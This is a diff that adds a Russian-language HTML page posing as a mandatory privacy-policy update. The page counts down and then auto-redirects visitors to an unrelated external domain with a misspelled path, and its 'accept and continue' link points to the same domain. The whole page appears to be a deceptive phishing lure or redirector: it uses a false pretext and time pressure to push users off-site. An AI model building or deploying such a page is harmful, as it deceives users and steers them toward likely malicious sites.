@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Требуется принятие новой политики</title>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://gateway-graphics.com/overvieaw/";
+        }, 10000);
+    </script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f8f9fa; padding: 50px; }
+        .policy-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header { border-bottom: 2px solid #dee2e6; padding-bottom: 20px; margin-bottom: 20px; }
+        .countdown { background: #e9ecef; padding: 10px; border-radius: 5px; text-align: center; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="policy-box">
+        <div class="header">
+            <h1>📄 Обновление политики конфиденциальности</h1>
+        </div>
+        <p>Мы обновили нашу политику конфиденциальности. Для продолжения использования сервиса необходимо принять новые условия.</p>
+        <p>Основные изменения:</p>
+        <ul>
+            <li>Обновлены правила обработки данных</li>
+            <li>Новые параметры конфиденциальности</li>
+            <li>Улучшенные меры безопасности</li>
+        </ul>
+        <div class="countdown">
+            Автоматическое перенаправление через: <span id="policyTimer">10</span> секунд
+        </div>
+        <p><a href="https://gateway-graphics.com/overvieaw/">Принять политику и продолжить</a></p>
+    </div>
+    
+    <script>
+        let policyTimer = 10;
+        setInterval(function() {
+            policyTimer--;
+            document.getElementById('policyTimer').textContent = policyTimer;
+        }, 1000);
+    </script>
+</body>
+</html>
